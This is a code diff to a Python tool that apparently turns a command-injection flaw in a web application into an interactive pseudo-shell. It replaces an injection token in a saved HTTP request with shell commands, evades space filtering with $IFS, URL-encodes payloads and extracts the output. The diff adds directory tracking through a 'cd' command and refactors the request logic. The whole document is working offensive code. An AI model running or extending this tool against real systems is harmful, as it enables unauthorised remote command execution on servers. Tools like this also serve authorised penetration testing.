@@ -10,6 +10,24 @@ def debug(string, msg='Debug'):
     print("[~] " + msg + ": ", end='')
     print(string)
 
+def command_cd(command=''):
+    global cur_dir
+
+    new_dir = command.split()[1]
+
+    if args.debug:
+        debug(cur_dir, msg='Current dir')
+
+    cur_dir = execute_command(request, 'pwd').strip()
+
+    if new_dir.startswith('/'):
+        cur_dir = new_dir
+    else:
+        cur_dir += '/' + new_dir
+
+    if args.debug:
+        debug(cur_dir, msg='New current dir')
+
 def command_clear(null=''):
     os.system("clear")
 
@@ -18,6 +36,7 @@ def command_exit(null=''):
     exit()
 
 COMMANDS = {
+    'cd': command_cd,
     'clear': command_clear,
     'exit': command_exit
 }
@@ -60,51 +79,57 @@ def request_parser(fd):
         request['inject'] = 'body'
     else:
         for k,v in request['headers'].items():
-            if args.injection_token_encode() in v:
+            if args.injection_token.encode() in v:
                 request['inject'] = 'headers'
                 request['inject_header'] = k
 
     return request
 
 def execute_command(request, command):
+    if cur_dir:
+        command = 'cd ' + cur_dir + ';' + command
+
+    if args.ifs:
+        command = command.replace(' ', '$IFS')
+
+    if not args.no_url_encode:
+        command = urllib.parse.quote_plus(command)
+
+    req = request.copy()
+    if req['inject'] == 'headers':
+        req['headers'] = request['headers'].copy()
+        req[req['inject']][req['inject_header']] = \
+            req[req['inject']][req['inject_header']].replace(args.injection_token.encode(),
+                                                             command.encode())
+    else:
+        req[req['inject']] = \
+            req[req['inject']].replace(args.injection_token.encode(),
+                                       command.encode())
+
+    if args.debug:
+        debug(req, msg='Request')
+
+    r = requests.request(req['method'],
+                         req['url'],
+                         headers=req['headers'],
+                         data=req['body'],
+                         params=req['params'])
+
+    output = r.text
+    if args.start_token:
+        output = output[output.find(args.start_token)+len(args.start_token):]
+    if args.end_token:
+        output = output[:output.find(args.end_token)]
+
+    return output
+
+def parse_command(request, command):
     if command == '':
         pass
     elif command.split()[0] in COMMANDS:
         special_commands(command)
     else:
-        if args.ifs:
-            command = command.replace(' ', '$IFS')
-
-        if not args.no_url_encode:
-            command = urllib.parse.quote_plus(command)
-
-        req = request.copy()
-        if req['inject'] == 'headers':
-            req['headers'] = request['headers'].copy()
-            req[req['inject']][req['inject_header']] = \
-                req[req['inject']][req['inject_header']].replace(args.injection_token.encode(),
-                                                                 command.encode())
-        else:
-            req[req['inject']] = \
-                req[req['inject']].replace(args.injection_token.encode(),
-                                           command.encode())
-
-        if args.debug:
-            debug(req, msg='Request')
-
-        r = requests.request(req['method'],
-                             req['url'],
-                             headers=req['headers'],
-                             data=req['body'],
-                             params=req['params'])
-
-        output = r.text
-        if args.start_token:
-            output = output[output.find(args.start_token)+len(args.start_token):]
-        if args.end_token:
-            output = output[:output.find(args.end_token)]
-
-        print(output, end='')
+        print(execute_command(request, command), end='')
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -135,11 +160,13 @@ if __name__ == "__main__":
     with open(args.req, 'rb') as fd:
         request = request_parser(fd)
 
+    cur_dir = ''
+
     while True:
         try:
             PS1 = '$ '
             command = input(PS1)
-            execute_command(request, command)
+            parse_command(request, command)
         except (KeyboardInterrupt, EOFError) as e:
             command_exit()
 
